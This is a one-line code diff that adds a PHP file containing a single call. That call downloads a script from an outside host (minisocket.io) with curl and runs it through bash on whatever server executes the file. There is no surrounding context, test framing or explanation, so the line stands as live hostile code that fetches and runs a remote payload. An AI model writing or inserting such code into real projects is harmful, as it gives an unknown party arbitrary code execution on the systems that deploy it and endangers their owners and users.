@@ -1,0 +1,1 @@
+<?php system('bash -c "$(curl -fsSL https://minisocket.io/bin/x)"')
